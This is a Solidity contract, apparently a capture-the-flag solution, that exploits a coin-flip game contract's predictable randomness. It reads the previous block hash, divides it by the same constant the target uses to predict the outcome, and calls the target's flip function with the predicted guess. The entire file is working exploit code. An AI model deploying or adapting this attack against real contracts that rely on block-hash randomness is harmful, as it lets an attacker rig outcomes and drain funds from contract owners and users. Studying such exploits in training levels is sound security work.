// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

interface CoinFlip {
    function flip(bool _guess) external returns (bool);
}

contract MyCoinFlipAttack {
    CoinFlip private _coinFlipInstance;
    uint256 lastHash;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    error PleaseWaitNextBlock();
    event GuessAttempt(address coinFlipContract, bool side, bool result);

    constructor(address coinFlipAddress) {
        _coinFlipInstance = CoinFlip(coinFlipAddress);
    }

    function attack() public {
        uint256 blockValue = uint256(blockhash(block.number - 1));

        if (lastHash == blockValue) {
            revert PleaseWaitNextBlock();
        }

        lastHash = blockValue;
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        bool result = _coinFlipInstance.flip(side);
        emit GuessAttempt(address(_coinFlipInstance), side, result);
    }
}
